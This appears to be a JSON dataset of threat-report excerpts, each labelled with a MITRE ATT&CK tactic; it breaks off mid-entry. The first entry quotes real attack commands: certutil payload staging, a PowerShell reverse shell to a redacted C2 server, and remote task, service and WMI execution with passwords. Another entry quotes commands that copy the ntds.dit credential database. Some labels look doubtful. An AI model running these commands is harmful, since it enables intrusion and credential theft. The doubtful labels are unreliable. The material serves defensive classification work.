[
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Windows Command Shell  T1059.003 Command and Scripting Interpreter \nAt this stage of attack, in order to upload malicious code to target devices and execute it, the threat actors chose the following unique method: \n1. Once the payload is compiled, it is encoded in Base64.   \n2. The encoded payload is divided into chunks of 775 characters and added to a text file using the following command: Echo [Base64]{775} >> C:\\dns.txt   \n3. Once the encoded payload has been written to a file, the utility called certutil with the parameter -decode is launched. The utility converts the Base64-encoded payload into an .exe file. Certutil is a built-in tool in Windows systems.   \n4. After the file is decoded, the attackers launch certutil again, with the parameter -hashfile. This parameter is necessary to obtain the hash of the resulting file. This action has to do with the fact that the attackers conduct each iteration manually and could make a mistake at a certain point. Checking the file hash helps ensure that the data has been written correctly and that the payload has been decoded without any errors.   \n5. The file is then renamed and sent to other directories to cover any tracks, after which the attackers launch it. \nThey used Cobalt Strike Beacon as a payload. In one of the observed cases, in order to write the entire payload to a file, the threat actors needed to repeat this action 154 times. \necho   \nTVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAA   \n>> C:\\dns.txt ---- echo   \nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA   \nC:\\dns.txt echo   \n5kgXfx+Ig8S1vr8p7ifpkRNTIwypOpYrBDdptgjbLcJBcAUqEK/+D85bYT9RGiYYZ9UR4ejo6ca0   \nC:\\dns.txt \ncertutil -decode C:\\dns.txt C:\\dns.exe certutil -hashfile C:\\dns.exe copy C:\\dns.exeC:\\WINDOWS\\dns.exe move C:\\dns.exe C:\\windows\\mciwave.exe\nThe same method of dividing the payload was observed in the network belonging to another organization, where the threat actors divided the code into chunks of 1,024 characters. To write the payload fully, in this case they needed 128 iterations. \necho   \no3wiZy3M7pERynevamNQTtL5VZf3C+vS22sRbsUgj8Lw005hIB1mVlNyvdw5GWrKgdMrpkJ2   \n>> C:\\temp\\bug.txt echo   \nWv39JqjpZEGW7rjPYW5t09Ck9AQTc94kJ5nfTPEh6KVvRAeuMw23lQdZy/ZquMQOcy9ozRl7   \n>> C:\\temp\\bug.txt \nBelow are other identified methods of uploading and executing malicious files. These are not unique: \nCommand and Scripting Interpreter: PowerShell  T1059.001 \nAPT41 used PowerShell to obtain a reverse shell. The PowerShell code that the group used was executed in stealth mode and meant that the device it was executed on could communicate with the C&C server, which in turn allowed the threat actors to execute remote commands. \npowershell -nop -W hidden -noni -ep bypass -c \"\\$TCPClient = New-Object Net.Sockets.TCPClient('{redacted}', 80);\\$NetworkStream = \\$TCPClient.GetStream();\\$StreamWriter = New-Object \nIO.StreamWriter(\\$NetworkStream);function WriteToStream (\\$String) {[byte[]]\\$script:Buffer =   \n0..\\$TCPClient.ReceiveBufferSize | % {0};\\$StreamWriter.Write(\\$String + 'SHELL>   \n');\\$StreamWriter.Flush()}WriteToStream '';while((\\$BytesRead =   \n\\$NetworkStream.Read(\\$Buffer, 0, \\$Buffer.Length)) -gt 0) {\\$Command =   \n([text.encoding]::UTF8).GetString(\\$Buffer, 0, \\$BytesRead - 1);\\$Output = try {Invoke  \nExpression \\$Command 2>&1 | Out-String} catch {\\$_ | Out-String}WriteToStream   \n(\\$Output)}\\$StreamWriter.Close()\" \nScheduled Task/Job: Scheduled Task  T1053.005 \nTask Scheduler was used to launch malicious files on computers where the threat actors already had sessions as well as on computers that the group discovered during reconnaissance. \nSCHTASKS /Create /S 192.168.100.19 /U \"{redacted}\\administrator\" /P \"!@#Virg0#@!\" /RU SYSTEM /SC DAILY /TN Exec2022 /TR \"C:\\windows\\system32\\taskhosts.exe\" SCHTASKS /run /S 192.168.100.19 /U \"{redacted}\\administrator\" /P \"!@#Virg0#@!\" /TN Exec2022 \nSystem Services: Service Execution  T1569.002 \nWindows services were created and launched with the aim of running either an executable or a script file called install.bat. We described it in our blog post about the ColunmTK campaign. This file has been mentioned several times by other vendors (e.g., Mandiant), which is why we are not describing it in detail here. \nsc \\\\172.16.2.146 Create SuperIe binPath= \"cmd.exe /k \"c:\\users\\public\\install.bat\"; sc \\\\192.168.111.112 create res binpath=\"C:\\PerfLogs\\vmserver.exe\"; sc \\\\192.168.111.112 start res; sc query LxpSrvc; sc delete LxpSrvc; \nWindows Management Instrumentation  T1047 \nThe hackers did not overlook Windows Management Instrumentation and used the technique in several malicious campaigns. \nwmic /node:172.19.97.102 /user:{redacted}\\{redacted} /password:P\\$ssw0rd0006 process call create \"C:\\users\\Public\\COMSysUpdate.exe\" wmic /node:172.21.2.177 /user:{redacted}\\ ",
        "output": "execution",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Initial access for this intrusion was via a malicious attachment \"order 06.21.doc\".  The attachment was a Microsoft Word document that drops a malicious HTA file \"textboxNameNamespace.hta\".",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actor brought in an executable named build_redacted.exe which wasTrigona Ransomware.\nAccording to Zscaler:\n* Trigonais a ransomware family written in the Delphi programming language that has been active since at least June 2022* The Trigona threat group claims to perform double extortion attacks by combining data exfiltration with file encryption* Trigona utilizes 4,112-bit RSA and 256-bit AES encryption in OFB mode for file encryption* The file decryption process is fairly convoluted with a tool that requires several steps to function properly* The ransomware has been regularly updated with new capabilities including a new data wiper feature\nWhile the ransomware affected the host they were executed on, the malware also initiated SMB connections to remote hosts encrypting them as well.\nAfter running the ransomware, it left behind the ransom note how_to_decrypt.hta pictured below.\nThis ransom note could also be observed distributed over the network with Zeek SMB logs.\nPlease consider providing feedback on this reporthere. If you would like to get an email when we publish a new report, please subscribehere.",
        "output": "impact",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Unit 42 researchers show new detection methods that help improve detection of a new line of Kerberos attacks, which allow attackers to modify Kerberos tickets to maintain privileged access. The most well-known example of this is the Golden Ticket attack, which allows threat actors to forge a ticket to masquerade as a high-privileged user.\nThese two newer attacks extend the Golden Ticket attack in that the forged tickets are not created from scratch, but instead based on modifying an existing ticket to include high-privileged access. We'll discuss the difference between these three types of attacks, to explain why the newer ones are harder to detect.\nThe broad usage of Active Directory has made Kerberos attacks the bread and butter of many threat actors. Researchers have discovered the following new attack techniques that allow an adversary to gain unconstrained access to all services and resources within an Active Directory (AD) domain:\nDiamond Ticket \nSapphire Ticket\nBecause of their similarity to the well-known Golden Ticket attack, threat actors might also use these attacks in future campaigns. People can better protect themselves by employing the new detection methods we'll discuss for these new Kerberos attacks.\nPalo Alto Networks customers receive improved detection for the attacks discussed in this blog through Cortex XDR.",
        "output": "other",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Based on the amount of publicly available information and current research and analysis, Palo Alto Networks highly recommends applying thepatch for Microsoft Officeto protect your organization. Palo Alto Networks and Unit 42 will continue to monitor the situation for updated information, release of proof-of-concept code and evidence of more widespread exploitation.\nPalo Alto Networks customers are protected by our products and services, as listed below. We will update this threat brief as more relevant information becomes available.\nPalo Alto Networks has shared our findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.",
        "output": "other",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Flax Typhoon achieves initial access by exploiting known vulnerabilities in publicfacing servers. The services targeted vary, but include VPN, web, Java, and SQL applications. The payload in these exploits is a web shell, such as China Chopper, which allows for remote code execution on the compromised server. ",
        "output": "initial access",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Upon exploiting the Exchange vulnerability, the attackers launched the following discovery commands to gather information about the device they had compromised: \ncmd.exe and the commands ver and systeminfo  to collect operating system information net.exe  to determine domain computers, domain controllers, and domain admins in the environment \nAfter executing these commands, the attackers navigated through directories and discovered a passwords folder that granted them access to account credentials they could use in the subsequent stages of the attack. They also used the del command to delete files related to their initial compromise activity. \nThe attackers then mounted a network share using net use and the stolen credentials and began looking for potential lateral movement targets using a combination of methods. First, they used WMIC.exe using the previously gathered device name as the node, launched the command whoami /all, and pinged google.com to check network connectivity. The output of the results were then written to a .log file on the mounted share. Second, the attackers used PowerShell.exe with the cmdlet Get-ADComputer and a filter to gather the last signin event. ",
        "output": "discovery",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Mandiant has no information to indicate that any of the PE infectors we uncovered were specifically targeting OT systems. Due to the worm-like nature of many PE infectors, there are multiple scenarios and attack vectors in which OT assets can become infected, most often without being specifically targeted. Table 1 provides a non-exhaustive list of examples. \nPE infectors often propagate by scanning filesystems, memory, local drives, network shares, and portable media for clean PE files and, once located, alter the clean PE by appending malicious code. For example, when the malware finds a file such as \"EventViewer.exe\", a legitimate Honeywell software used to view security alarms, it appends itself to the executable but keeps the original name and the program functionality. Procedures used to execute this vary in complexity among different families and variants of PE infectors. Table 2 presents a random sample of infected OT OEM binaries we uncovered. \nPE infected malware introduced in OT environments can propagate quickly where protection levels are consistent throughout systems and networks. For example, if the initial infection vector is through portable media due to a lack of implementation of scanning and sanitization controls, then asset ",
        "output": "other",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: By analyzing the modified Python DLL (python311.dll), we notice multiple defense evasion functionalities implemented, such as:\nRemoving hooks from Windows API functions. \nObfuscating the payload in memory (i.e., Sleep Obfuscation). \nBypassing AMSI, WLDP, and ETW.\nBased on code overlaps, those techniques could have been copied from the following GitHub repositories:\nAntimalware-Research/Generic/Userland Hooking/AntiHook at master ` NtRaiseHardError/Antimalware-Research ` GitHub \nGitHub  RtlDallas/KrakenMask: Sleep obfuscation \ndonut/loader/bypass.c at master ` TheWover/donut ` GitHub \nPatching WLDP ` GitHub\nAn example of code overlap is showed in the following image related to the IsHooked() function.\nWith the aim to conceal the malicious activities into normal system events, the threat actor masqueraded both the initial payload and the persistence mechanisms by:\nRenaming python.exe to setup.exe.\nNaming the scheduled tasks to mirror OneDrive and Microsoft Edge.\nRenaming python executable used for executing their python stagers for Sliver and Cobalt Strike.\nProcess injection\nThe threat actor was observed injecting into various processes during the intrusion. One specific occasion was during the elevation to SYSTEM on the beachhead host.\nClearing logs\nExecution of the ransomware payload included clearing of various event logs while the hosts were in safe mode.\nSafeboot\nBefore executing the final ransomware the threat actor set all hosts to restart in safe mode with networking. This can be used to prevent antivirus or other preventative tools from stopping the ransom execution as many won't start when a host is booted in safe mode. It has beenusedby several ransomware families.",
        "output": "defense evasion",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Named pipe impersonation was used to escalate to SYSTEM privileges  a common Cobalt Strike capability:\nWe observed several attempts by the threat actor trying to escalate to SYSTEM  ultimately succeeding, as evident in several new services running under the Local SYSTEM context:\nService creation events System Event ID 7045, coupled with unusual commands and service names are a strong indication of privilege escalation activity. RedCanary provided useful background on GetSystem capabilities of offensive security tools andmethods of detection.",
        "output": "privilege escalation",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actors were evicted from the network before any further impact.",
        "output": "impact",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The BazarLoader ISO downloaded from the OneDrive link, consists of a malicious DLL and shortcut file named \"Documents.lnk\" which executes the DLL via rundll32.exe.\nAfter the initial execution, the malware contacted two of its C2 IPs:\nWe then observed threat actors dropping multiple Cobalt Strike Beacon DLL's on the host in the following file paths:",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Near the end of day nine, the threat actor prepared for ransomware deployment by downloading a set of files necessary for its propagation. The file archive utility WinRar 7.0.1 was downloaded using Microsoft Edge and installed on one of the domain controllers.\nThe Edge history file C:\\Users\\<redacted>\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History contained the following entry:\nWinRAR was used to uncompress an archive fetched from the temporary storage websitetemp.sh.\nThe contents of the RAR archive were extracted into the local user's Downloads directory.\nThe RAR archive contained the following files:\n123.exe \nPsExec.exe \ncomps[1-4].txt \nCOPY.bat \nEXE.bat\nThe threat actor created a network share to stage the files and facilitate the deployment process:\nThe batch script COPY.BAT was then executed and distributed the BlackSuit ransomware payload named 123.exe to multiple remote hosts using PsExec. The files comps[1-4].txt  represented target lists containing private IP addresses of hosts on the victim's network.\nThe second batch script EXE.bat contained within the RAR archive, was executed to initiate the encryption process on the designated remote hosts using PsExec.\nThe ransomware targeted data recovery mechanisms by attempting to delete all Volume Shadow Copies (VSS).\nFinally, the threat actor used WMIC on their staging domain controller, to execute the ransomware a final time.\nThe following ransom note was displayed on all affected systems post-encryption.",
        "output": "impact",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: All your data belong to me! \nInvoke-TokenManipulation - Lists available logon tokens. Creates processes with other users logon t Invoke-CredentialInjection - Create logons with clear-text credentials without triggering a suspici Invoke-NinjaCopy - Copies a file from an NTFS partitioned volume by reading the raw volume and pars Invoke-Mimikatz - Reflectively loads Mimikatz 2.0 in memory using PowerShell. Can be used to dump c Get-Keystrokes - Logs keys pressed, time and the active window.   \nGet-GPPPassword - Retrieves the plaintext password and other information for accounts pushed throug Get-GPPAutologon - Retrieves autologon username and password from registry.xml if pushed through Gr Get-TimedScreenshot - A function that takes screenshots at a regular interval and saves them to a f New-VolumeShadowCopy - Creates a new volume shadow copy.   \nGet-VolumeShadowCopy - Lists the device paths of all local volume shadow copies.   \nMount-VolumeShadowCopy - Mounts a volume shadow copy.   \nRemove-VolumeShadowCopy - Deletes a volume shadow copy.   \nGet-VaultCredential - Displays Windows vault credential objects including cleartext web credentials Out-Minidump - Generates a full-memory minidump of a process.   \nGet-MicrophoneAudio - Records audio from system microphone and saves to disk. ",
        "output": "exfiltration",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Malvertising has been one of the most prevalent techniques in Node.js attacks we've observed in customer environments. Attackers use malvertising campaigns to lure targets to fraudulent websites, where the targets then unknowingly download a malicious installer disguised as legitimate software. These fake websites often take advantage of popular themes such as financial services, software updates, and trending applications. \nIn this campaign, the downloaded installer contains a malicious DLL that gathers system information and sets up a scheduled task for persistence. This sets the stage for its other techniques and activities, such as defense evasion, data collection, and payload delivery and execution. ",
        "output": "other",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: In this case, four separate command and control channels were used, SectopRAT, Brute Ratel, QDoor and Cobalt Strike. All these frameworks were used by the threat actor to move in and out of the victim's environment.\nSectopRAT:\nThe following rules triggered on the traffic, after SectopRAT injected itself into the MSBuild.exe process for 45.141.87[.]218.\nThis rule fired when traffic to the destination port 15647 was observed:\nThis rule fired during C2 beaconing activity to destination port 9000 that looked like:\nBrute Ratel Badger:\n5.181.159[.]31 with the associated domain megupdate.com\nWhen looking for this activity, the following rules were associated to this IP:\nET INFO Observed ZeroSSL SSL/TLS Certificate\nFor this Badger (2905.dll), the following config was extracted:\nAnother sample (3004.dll) was found in the environment, containing a different configured C2:\nCobalt Strike Beacon:\nThe beacon had the following configuration (trimmed):\nThis is interesting as this matches the second Badger which was configured to use atyk[.]iodomain, but showed no traces of execution.Tykis an open source universal API management tool for REST, GraphQL, gRPC and async APIs, enabling quick API setup and access. This kind of activity is becoming more common, as this enables threat actors leveraging legitimate infrastructure for their malicious campaigns. An example, showing the usage of Cobalt Strike, is this blog from 2022 written by Askar onshells.systems, showing the exact same uri's as in this campaign.\nIt is unclear why the threat actor decided to continue with Cobalt Strike instead of Brute Ratel during lateral movement, especially if the unexecuted Badger contained a similar Tyk C2 domain.\nQDoor\nDuring this intrusion we observed a proxy used by the threat actor. This proxy turned out to be a tool called QDoor that has been seen in multiple other case involving BlackSuit ransomware. It has been written about by ConnectWise in which its functionality is explained in more detail:\nQDoor can also be run with command-line arguments, by passing an address for C2 configuration, which was the case in this intrusion:\nThis activity triggered the following ET rule, indicating an tunneled RDP sessions over the established proxy facilitated by QDoor:",
        "output": "command and control",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: A few minutes later, the threat actor deployed Python scripts on the beachhead, serving as loaders for both Sliver and Cobalt Strike.\nThe following image shows the sequence of beacons executed on the beachhead host.\nThe Python script, slv.py, used to load Sliver into memory, was heavily obfuscated. However, buried within thousands of lines of code was the critical section responsible for executing the Sliver beacon.\nBased on the analysis of these artifacts, it appears the Sliver payload was likely obfuscated usingPy-Fuscate, as the tool's encode function mirrored the same imports and procedures found in the obfuscated script, effectively concealing the malicious code.\nThe Sliver execution revealed multiple interesting debugging strings. In the first instance, Windows API functions' addresses are resolved.\nSubsequently, the Sliver DLL is injected in memory and the DLL entrypoint is called.\nThose debugging strings are the same ones used byPyramidin thepythonmemorymodulewhich is a module used to inject and execute DLLs in memory.\nBy analyzing the Python.exe process memory, it was possible to notice the DLL injected in the memory sections previously described in the debugging strings.\nThe Sliver DLL exports multiple functions, however, StartW is the one to run the beacon.\nMultiple strings related to Sliver were found in the process memory.\nwo14.py is another highly obfuscated Python script that acts as a loader for custom shellcode. In this specific case, the threat actor specified an AES-encrypted Cobalt Strike shellcode which is:\nDecrypted through the key \"we3p2v5t85\". \nCopied into a newly allocated memory region in the Heap. \nExecuted by invoking the function CreateThread.\nwo12.py has the same behavior.\nThe Sysmon Event ID 10 shows the self-injection technique performed by the Python Cobalt Strike loader.",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Cadet Blizzard frequently persists on target networks through the deployment of commodity web shells used either for commanding or tunneling. Commonly utilized web shells include P0wnyshell, reGeorg, PAS, and even custom variants included in publicly available exploit kits. \nIn February 2023, CERT-UA reported an attempted attack against a Ukrainian state information system that involved a variant of the PAS web shell, which Microsoft assesses to be unique to Cadet Blizzard operations at the time of the intrusion. ",
        "output": "persistence",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Thirty-four days after the first infection, and about 28 hours after the beginning of hands-on activity, the threat actors proceeded to their final actions, deploying Nokayawa ransomware. The variant of Nokoyawa was similar to those we've alreadyreported on.\nAs in most ransomware related cases, before actual deployment, the threat actors looked around to gather information related to backup functionality and systems. In this case, the threat actors moved around between a file server and a backup server, making and viewing configurations, dropping and 'debugging' the ransomware and finally cleaning up.\nThe threat actors started by usingmmc.exeto look into the Local Group Policy by usinggpedit.msc.Around 20 minutes later, the threat actors started executing the ransomware script on the file server.\nThe ransomware files, in this casesvchost.exeand an 'automation' file[REDACTED].1.bat, were delivered via the AnyDesk sessions as parent process.\nThe batch script,[REDACTED].1.bat, launched the executablesvchost.exewith a--configparameter, containing a base64 encoded string:\nAfter the execution on the file server, the threat actors moved to the backup server, where they repeated their interest in the Group Policy. On the backup server, they also opened the server configuration. There appeared to be a problem, as there was some 'file locking' in place, likely preventing access. The threat actors tried to circumvent these 'locks' by utilizing a tool calledIOBit. This tool is capable of removing file locks.\nAfter this, the ransomware was deployed in the same manner as on the file server. However, there appeared to be a problem with the deployment. The threat actors startedProcessHackerand utilizednotepad++tolikelyfix something related to the ransomware execution. This is based on the fact that, the threat actors executed the ransomware binary 11 times on the backup server and afterwards returned and executed the ransomware a second time on the file server.\nAfter encrypting the back up server, the threat actors uninstalled the backup software using add/remove programs.\nIn addition,notepadwas used to view the deployed ransom note after the final execution on the file server. The NOTE_CONTENT (from above base64 configuration) appears to be base64 encoded again and decoded gives the following ransom note:\nThe threat actors only deployed the ransomware on the two servers and did not perform a domain wide deployment. After the ransom of these two systems, the threat actor's activity ceased.\nPlease consider leaving feedback on this reporthere.",
        "output": "impact",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Qbot moved laterally to all workstations in the environment by copying a dll to the machine and then remotely creating a service to execute the Qbot dll. The services created had the DeleteFlag set causing the service to be removed upon reboot.\nThe following occurred on each workstation:\nThe lateral movement activity from the beachhead host was rapid and connections were seen across all workstations in the network. A view from the memory of the beachhead host shows the injected msra process connecting to hosts across the network.\nThe service creations were also observed via event id 7045 across all hosts.",
        "output": "lateral movement",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Bumblebee uses a Cobalt Strike agent for lateral movement. We can see multiple connections from the process to internal addresses on Remote Desktop Protocol (RDP), on TCP port 3389: \nBumblebee lateral movement from Cobalt Strike agent as seen in the Cybereason Defense Platform \nFollowing the lateral movement, the attacker persists on the organization network using the remote management software \"any desk\": \nBumblebee operators using Anydesk for lateral movement as seen in the Cybereason Defense Platform \nBy clicking \"Accept All Cookies\", you agree to the storing of cookies on your device to enhance site navigation, analyze site usage, and assist in our marketing efforts. \nntds.dit file from the domain controller. \nThe ntds.dit file is a database that stores Active Directory data, including information about user objects, groups and group membership. The file also stores the password hashes for all users in the domain: \nBumblebee creates shadow copies on remote Active Directory server and exfiltrates Ntds.dit as seen in the Cybereason Defense Platform \nThe following are the commands related to credential theft used to escalate privileges on the Active Directory: \n\u200bwmic /node:\"[Active Directory IP address]\" /user:\"[Compromised user name]\" /password:\"[Compromised user password]\" process call create \"cmd /c vssadmin create shadow /for $\\scriptstyle=C$ $2{>}\\&1^{\\prime\\prime}$ \nwmic /node:\"[Active Directory IP address]\" /user:\"[Compromised user \nBy clicking \"Accept All Cookies\", you agree to the storing of cookies on your device to enhance site navigation, analyze site usage, and assist in our marketing efforts. \nc:\\ProgramData\\nt & copy \\\\?   \n\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy635\\Windows\\System32\\config\\SECURITY   \nc:\\ProgramData\\nt\" \n7za.exe a -mx3 nt.7z \\\\[Active Directory IP address]\\c\\$\\ProgramData\\nt \nIn order to obtain maximum privileges on the Active Directory domain, the threat actor: \nCreates a shadow copy of the machine file's volume Lists all available shadow copies and stored the result in a file. Copies the Active Directory database (ntds.dit) as well as registry hives containing credentials and sensitive data from the shadow copy. Compress the output directory for exfiltration. ",
        "output": "lateral movement",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Unit 29155 cyber actors are known to use VPNs to anonymize their operational activity. These cyber actors commonly attempt to exploit weaknesses in internet-facing systems, like the CVEs listed above, to initially access networks. In one instance, Unit 29155 cyber actors exploited CVE-2021-33044 and CVE-2021- 33045 on Dahua IP cameras to bypass identity authentication. ",
        "output": "initial access",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The BumbleBee malware has been following the trend of using the effective combination of utilizing an .iso image containing a .lnk and .dll file. We have observed the same behavior with other major malware distributors in previous reports:\nIcedID Stolen Images Campaign Ends in Conti Ransomware \nBazarLoader Diavol Ransomware\nUsing the event log, \"Microsoft-Windows-VHDMP-Operational.evtx\", we can quickly find when the user mounted the .iso.\nUpon clicking the LNK file the BumbleBee payload was executed.",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: CISA observed the threat actor using the techniques identified in table 6 to further their credential access. ",
        "output": "credential access",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: During the intrusion, we witnessed the threat actors elevate privileges on several systems using the built-in GetSystem named pipe privilege escalation tool in Cobalt Strike.",
        "output": "privilege escalation",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: After exploiting Zerologon on the domain controller, the threat actor tried a few more things and then took a break from the hands on keyboard portion of the intrusion. The threat actor was then evicted from the environment. During IR, it was found that the primary domain controller was unresponsive to domain authentication due to the exploit run against it, resulting in domain authentication breaking around the environment.",
        "output": "impact",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Around an hour after the initial access occurred a single PowerShell command was observed from the Cobalt Stike beacon running the well known nltest Microsoft utility to discover Active Directory domain controllers.\nRight after this, the threat actor immediately pivoted to the domain controller. But after gaining lateral access to that host, they returned to the beachhead for more discovery actions.\nAround this same time on the beachhead an injected process, WUAUCLT.exe, was also observed loading Seatbelt and SharpView modules.\nSeatbeltis a post-exploitation tool designed to gather recon about a system. It can collect data like security settings, credentials, browser history, and more. \nSharpViewis an AD recon tool that can map an entire AD environment and provide key details like users, groups, permissions, and relationships.\nDuring the first day, the threat actor dropped a binary check.exe onto a file server.\nThis Visual Basic GUI software accepts an IP address as input and generates multiple files with detailed information about the corresponding computer.\nAround the same time as the threat actor was running check.exe, they initiated a remote PowerShell session to a domain controller to run some Active Directory discovery using PowerShell.\nOn a file server the threat actor reviewed Windows Task Manager several times.\nThroughout the intrusion the threat actor reviewed Group Policy settings. On the first day, they checked Windows Defender settings on a file server. On the final day, they checked on the backup server after completing their ransom deployment.",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1059: Command and Scripting Interpreter   \nT1059.001: PowerShell   \nT1059.003: Windows Command Shell   \nT1059.004: Unix Shell   \nT1059.006: Python   \nT1129: Shared Modules ",
        "output": "execution",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: In August 2023 we observed an IcedID e-mail phishing campaign, utilizingPrometheusTDSURLs directly in email.\n@ffforwardreported the distribution onTwitter:\nFor a full breakdown on the TDS see thisreportby Group-IB.\nOnce the user clicked the link, they would be presented with an Azure looking page containing a captcha, and if they pass all the filtering requirements of the TDS they would be presented with a download for a JavaScript file,Document_Scan_468.jsin this intrusion.",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actor was observed moving via RDP throughout the network with a Domain Admin account.\nAs mentioned in Credential Access, the threat actor used remote services to execute commands on remote hosts.\nSMB was used to transfer the various tools laterally, as needed in the environment, like procdump.exe and AnyDesk executables.",
        "output": "lateral movement",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
